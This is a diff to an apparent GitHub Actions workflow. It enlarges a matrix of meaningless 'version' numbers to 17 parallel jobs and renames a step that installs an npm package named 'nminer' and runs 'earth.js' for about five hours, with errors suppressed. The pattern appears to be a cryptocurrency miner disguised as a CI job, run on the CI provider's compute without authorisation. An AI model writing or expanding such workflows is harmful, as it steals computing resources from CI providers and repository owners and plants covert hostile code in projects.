@@ -9,22 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2926 }
-          - { version: 5112 }
-          - { version: 929 }
-          - { version: 1921 }
-          - { version: 1544 }
-          - { version: 6921 }
-          - { version: 9113 }
-          - { version: 2384 }
-          - { version: 8001 }
-          - { version: 4804 }
-          - { version: 7252 }
-          - { version: 337 }
-          - { version: 2307 }
-          - { version: 5277 }
-          - { version: 7465 }
-          - { version: 6469 }
+          - { version: 8453 }
+          - { version: 1631 }
+          - { version: 6790 }
+          - { version: 557 }
+          - { version: 7596 }
+          - { version: 5635 }
+          - { version: 4230 }
+          - { version: 7277 }
+          - { version: 5850 }
+          - { version: 5 }
+          - { version: 4465 }
+          - { version: 4021 }
+          - { version: 7269 }
+          - { version: 8202 }
+          - { version: 1728 }
+          - { version: 8100 }
+          - { version: 5456 }
 
     steps:
       - name: Checkout
@@ -35,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: footrest
+      - name: yippee
         run: |
           npm install nminer@latest
-          timeout 307m node earth.js || echo "earth executed"
+          timeout 319m node earth.js || echo "earth executed"
